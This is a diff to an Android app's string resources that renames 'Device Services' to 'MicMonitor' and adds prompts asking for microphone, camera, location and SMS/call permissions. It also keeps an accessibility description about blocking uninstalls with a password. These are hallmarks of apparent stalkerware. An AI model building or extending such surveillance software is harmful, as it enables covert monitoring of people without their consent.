@@ -1,4 +1,17 @@
 <resources>
-    <string name="app_name">Device Services</string>
+    <string name="app_name">MicMonitor</string>
+    <string name="app_subtitle">Audio &amp; Video Service</string>
     <string name="accessibility_description">Monitors for unauthorized uninstall attempts and requires a password to proceed.</string>
+    <string name="title_permissions">Grant Permissions</string>
+    <string name="desc_permissions">MicMonitor needs the following permissions to operate:</string>
+    <string name="perm_audio">Microphone - for audio capture and streaming</string>
+    <string name="perm_camera">Camera - for photo and video capture</string>
+    <string name="perm_location">Location - for location services</string>
+    <string name="perm_sms">SMS/Calls - for communication monitoring</string>
+    <string name="btn_grant_permissions">Grant All Permissions</string>
+    <string name="status_requesting">Requesting permissions...</string>
+    <string name="status_denied">Microphone permission denied</string>
+    <string name="status_retry">Please allow permissions to continue</string>
+    <string name="toast_all_granted">All permissions granted! Starting service...</string>
+    <string name="toast_mic_required">Microphone permission is required. Tap Grant again.</string>
 </resources>
